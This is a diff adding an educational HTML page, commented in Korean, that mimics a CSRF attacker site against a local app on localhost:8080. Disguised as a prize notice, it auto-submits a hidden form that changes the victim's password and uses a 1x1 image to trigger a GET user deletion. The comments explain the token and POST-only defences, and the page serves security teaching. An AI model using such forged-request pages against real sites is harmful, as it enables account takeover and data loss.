@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<!--
+  [ 교육용 - CSRF 공격자 페이지 ]
+
+  이 파일은 "공격자 사이트"를 흉내 낸다. 앱이 서빙하지 않으며,
+  브라우저에서 파일로 직접 열거나(file://) 다른 오리진에서 호스팅해 사용한다.
+
+  이 페이지에는 두 가지 CSRF 벡터가 들어 있다. (각각 독립적으로 동작)
+
+  [벡터 1] POST 자동 제출 - 비밀번호 변경
+    1) 피해자가 http://localhost:8080 에 폼 로그인(세션 쿠키 JSESSIONID 보유)
+    2) 피해자가 이 페이지를 방문(공격자가 링크·이미지·메일 등으로 유도)
+    3) onload 로 폼이 자동 제출됨 → 브라우저가 JSESSIONID 를 자동 첨부
+    4) CSRF 보호가 없으면 비밀번호가 attacker_pw_1234 로 바뀜 → 계정 탈취
+    → 세션 체인 CSRF 가 켜져 있으면 _csrf 토큰이 없어 403 으로 거부된다.
+
+  [벡터 2] GET 이미지 - 사용자 삭제 (예전 방식의 위험성 재현)
+    - 서버가 삭제를 GET 으로도 받으면(/users/delete/{id}),
+      <img> 태그 한 줄만으로 상태 변경이 트리거된다.
+    - GET 은 CSRF 토큰 검증 대상이 아니므로, 토큰이 켜져 있어도 이 삭제는 막지 못한다.
+    - 진짜 방어는 "삭제를 POST 로만 받는 것"(GET 핸들러 제거)이다.
+    - 아래 <img> 는 id=1 사용자를 삭제한다. 실습 전 삭제해도 되는 계정으로 준비할 것.
+-->
+<html lang="ko">
+<head><meta charset="UTF-8"><title>사은품 이벤트 당첨!</title></head>
+<body onload="document.getElementById('csrf').submit()">
+  <h2>축하합니다! 사은품 이벤트에 당첨되셨습니다.</h2>
+  <p>잠시만 기다려 주세요...</p>
+
+  <!-- [벡터 1] 피해자 모르게 자동 제출되는 위조 요청 (CSRF 토큰 없음) -->
+  <form id="csrf" action="http://localhost:8080/users/change-password" method="post">
+    <input type="hidden" name="newPassword" value="attacker_pw_1234" />
+  </form>
+
+  <!-- [벡터 2] 이미지 한 줄로 트리거되는 GET 삭제 (예전 방식의 위험성 재현).
+       서버에 GET /users/delete/{id} 핸들러가 있으면, 피해자의 세션 쿠키가 자동 첨부되어
+       id=1 사용자가 삭제된다. GET 이라 _csrf 토큰 검증을 우회한다. -->
+  <img src="http://localhost:8080/users/delete/1" alt="event" width="1" height="1" style="border:0" />
+</body>
+</html>
